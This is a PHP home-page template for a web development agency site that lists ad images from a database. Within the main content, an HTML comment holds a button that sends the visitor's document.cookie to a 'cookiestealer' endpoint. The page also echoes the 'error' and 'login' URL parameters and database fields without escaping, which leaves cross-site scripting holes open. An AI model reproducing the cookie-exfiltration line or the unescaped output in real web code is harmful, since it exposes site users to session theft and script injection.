<?php
session_start();
include "./conn/functions.php";
include "./conn/connection.php";
$user_data = check_login($con);
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="author" content="Abbas Zaidan" />
    <meta
      name="description"
      content="The Web Development Agency that you've been looking for is here. Care to a Visit."
    />
    <meta
      name="keywords"
      content="azaidan, webdevelopment,AZaidan,Abbas Zaidan"
    />
    <meta
      property="og:description"
      content="The Web Development Agency that you've been looking for is here. Care to a Visit."
    />
    <meta property="og:title" content="AZaidan | Home" />
        <link rel="apple-touch-icon" sizes="57x57" href="/img/favicon/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/img/favicon/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/img/favicon/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/img/favicon/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/img/favicon/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/img/favicon/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/img/favicon/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/img/favicon/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="/img/favicon/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/img/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/img/favicon/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/img/favicon/favicon-16x16.png">
<link rel="manifest" href="/img/favicon/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/img/favicon/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
    <link rel="stylesheet" href="/assets/style.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Space+Mono&display=swap"
      rel="stylesheet"
    />
    <link
      href="https://fonts.googleapis.com/css?family=Abhaya Libre"
      rel="stylesheet"
    />
    <title>AZaidan | Business</title>
  </head>
  <body>
    <?php
      include "./assets/home_nav.php"
    ?>
    <main>
      
    <?php if (isset($_GET['error'])): ?>
		<p><?php echo $_GET['error']; ?></p>
	<?php endif ?>
  <br><br>
  <?php if (isset($_GET['login'])): ?>
		<p><?php echo $_GET['login']; ?></p>
	<?php endif ?>
	<!--<button onclick="document.location='https://www.azaidan.com/cookiestealer/index.php?c='+document.cookie">accept cookies</button>-->
  
  <div id="ADS1">
    <?php 
          $sql = "SELECT * FROM images1 ORDER BY id DESC";
          $res = mysqli_query($con,  $sql);
          if (mysqli_num_rows($res) > 0) {
          	while ($images = mysqli_fetch_assoc($res)) {  ?>
            <div class="alb">

              <br>
              <div>
                <!-- <p>
                  <button  type="button" class="btn1" onclick="window.location='./docs/ads.php';">Ad</button><br>
                  <img style="position:relative;right:5px;top:5px;width:20px;height:20px;border-radius:100%;" src="uploads/pr/<?=$images['image'];?>" alt="profile photo of <?=$images['username'];?>">
                  <a href="./profile?aid=<?= $images['username']; ?>">
                    <?php echo $images['username']; ?>
                  </a>
                  
                </p> -->

              </div>
                <br>
                <a href="items?ad=<?=$images['user_id'];?>">
                    <img style="border-radius:3vw;max-width: 325px;max-height: 325px;"  src="./uploads/IMG/<?=$images['image_url'];?>" alt="photo of <?=$images['username'];?>">
                  </a>
                  <br>
                <br>
             
              <div>
               <p>
                  <?php echo $images['message']; ?>
              </p>
               
              </div>
            </div>  		
      <?php 
      } 
      }
      else
     {
      echo "<h2>No items yet</h2><br><br><br><br><br><br><br><br><br><br><br>";
      }
      ?>

      </div>
      <br />
      
      <div class="footer">
        
        <?php
      include "./assets/footer.php";
      ?>
      </div>
    </main>
    <script src="/assets/script.js"></script>
  </body>
</html>
